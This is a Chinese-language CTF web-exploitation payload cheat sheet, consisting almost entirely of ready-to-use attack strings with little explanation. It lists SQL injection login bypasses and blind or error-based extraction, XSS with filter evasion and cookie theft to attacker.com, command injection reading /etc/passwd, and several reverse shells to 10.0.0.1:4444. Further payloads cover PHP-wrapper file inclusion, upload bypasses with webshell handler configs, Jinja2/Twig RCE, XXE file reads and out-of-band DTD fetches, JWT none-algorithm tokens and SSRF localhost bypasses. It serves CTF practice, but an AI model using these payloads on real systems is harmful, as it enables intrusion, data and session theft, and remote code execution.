# CTF Web Skill - Payload 集合

## SQL 注入

### 万能密码
```sql
' OR '1'='1
' OR 1=1--
admin'--
' OR '1'='1'/*
' OR 1=1#
') OR ('1'='1
```

### 联合注入
```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
0' UNION SELECT 1,2,3--
-1' UNION SELECT 1,2,3--
' UNION SELECT 1,database(),3--
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
```

### 报错注入
```sql
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
' AND (SELECT 1 FROM (SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND exp(~(SELECT * FROM (SELECT user())a))--
```

### 盲注
```sql
' AND (SELECT SUBSTRING(database(),1,1))='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--
' AND IF(1=1,SLEEP(5),0)--
' AND BENCHMARK(10000000,MD5('a'))--
```

### 绕过
```sql
-- 空格绕过
/**/  %09  %0a  %0b  %0c  %0d  ()

-- 关键字绕过
ununionion  selselectect
Un/**/IoN  Se/**/LeCt

-- 引号绕过
0x61646d696e  (admin 的十六进制)
CHAR(97,100,109,105,110)
```

---

## XSS

### 基础 Payload
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<details open ontoggle=alert(1)>
```

### 闭合标签
```html
"><script>alert(1)</script>
'><script>alert(1)</script>
</script><script>alert(1)</script>
</title><script>alert(1)</script>
```

### 事件绕过
```html
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<body/onload=alert(1)>
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
```

### 编码绕过
```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<img src=x onerror=window['al'+'ert'](1)>
```

### Cookie 窃取
```html
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
<script>location='http://attacker.com/?c='+document.cookie</script>
<img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>
```

---

## 命令执行

### 基础
```bash
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
```

### 空格绕过
```bash
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
{cat,/etc/passwd}
cat</etc/passwd
X=$'cat\x20/etc/passwd'&&$X
```

### 关键字绕过
```bash
c\at /etc/passwd
c''at /etc/passwd
c""at /etc/passwd
ca$@t /etc/passwd
/???/c?t /etc/passwd
```

### 反弹 Shell
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
nc -e /bin/bash 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

---

## 文件包含

### PHP 伪协议
```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://input  + POST: <?php system('id'); ?>
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
phar://test.jpg/shell.php
zip://test.zip%23shell.php
```

### 路径遍历
```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
```

### 日志位置
```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

---

## 文件上传

### 后缀绕过
```
.php .phtml .php3 .php4 .php5 .php7
.Php .pHp .PHP
.php.jpg .php.png
.php. (Windows)
.php::$DATA (Windows NTFS)
.pphphp
```

### 文件头
```
GIF: GIF89a
PNG: \x89PNG\r\n\x1a\n
JPG: \xff\xd8\xff\xe0
```

### .htaccess
```apache
AddType application/x-httpd-php .jpg
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

### .user.ini
```ini
auto_prepend_file = shell.jpg
```

---

## SSTI

### 检测
```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[xxx].__init__.__globals__['os'].popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
```

### Twig RCE
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
{{["id"]|filter("system")}}
```

---

## XXE

### 基础
```xml
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### PHP 读源码
```xml
<!DOCTYPE test [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">]>
```

### OOB 外带
```xml
<!DOCTYPE test [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
```

---

## JWT

### None 算法
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

### 常见弱密钥
```
secret
password
123456
key
admin
```

---

## PHP 特性

### MD5 绕过
```
0e 开头: QNKCDZO, 240610708, s878926199a
数组绕过: ?a[]=1&b[]=2
```

### 弱类型
```php
"admin" == 0  // true
"1admin" == 1 // true
"0e123" == 0  // true
```

### 变量覆盖
```
?_SESSION[admin]=1
?password=xxx  (配合 extract)
```

---

## SSRF

### 127.0.0.1 绕过
```
127.0.0.1
127.1
0
0.0.0.0
[::1]
2130706433 (十进制)
0x7f000001 (十六进制)
127.0.0.1.nip.io
```

### 协议
```
http://
file:///etc/passwd
gopher://
dict://
```

